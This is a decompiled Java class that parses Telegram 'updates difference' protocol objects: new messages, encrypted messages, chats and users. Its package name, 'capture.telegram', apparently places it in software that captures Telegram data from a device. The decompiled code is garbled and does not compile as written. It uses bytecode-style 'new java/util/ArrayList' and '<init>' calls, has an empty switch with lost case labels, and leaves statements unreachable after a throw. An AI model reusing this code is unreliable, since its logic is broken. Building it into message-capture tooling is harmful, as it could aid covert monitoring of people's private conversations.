package com.vvt.capture.telegram.internal;

import java.util.ArrayList;

public class TLRPC$updates_Difference
  extends TLObject
{
  public ArrayList chats;
  public int date;
  public TLRPC.TL_updates_state intermediate_state;
  public ArrayList new_encrypted_messages;
  public ArrayList new_messages;
  public ArrayList other_updates;
  public int seq;
  public TLRPC.TL_updates_state state;
  public ArrayList users;
  
  public TLRPC$updates_Difference()
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    this.new_messages = localArrayList;
    localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    this.new_encrypted_messages = localArrayList;
    localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    this.other_updates = localArrayList;
    localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    this.chats = localArrayList;
    localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    this.users = localArrayList;
  }
  
  public static updates_Difference TLdeserialize(AbstractSerializedData paramAbstractSerializedData, int paramInt, boolean paramBoolean)
  {
    Object localObject = null;
    switch (paramInt)
    {
    }
    while ((localObject == null) && (paramBoolean))
    {
      localObject = new java/lang/RuntimeException;
      Object[] arrayOfObject = new Object[1];
      Integer localInteger = Integer.valueOf(paramInt);
      arrayOfObject[0] = localInteger;
      String str = String.format("can't parse magic %x in updates_Difference", arrayOfObject);
      ((RuntimeException)localObject).<init>(str);
      throw ((Throwable)localObject);
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_updates_differenceEmpty;
      ((TLRPC.TL_updates_differenceEmpty)localObject).<init>();
      continue;
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_updates_differenceSlice;
      ((TLRPC.TL_updates_differenceSlice)localObject).<init>();
      continue;
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_updates_difference;
      ((TLRPC.TL_updates_difference)localObject).<init>();
    }
    if (localObject != null) {
      ((updates_Difference)localObject).readParams(paramAbstractSerializedData, paramBoolean);
    }
    return (updates_Difference)localObject;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$updates_Difference.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */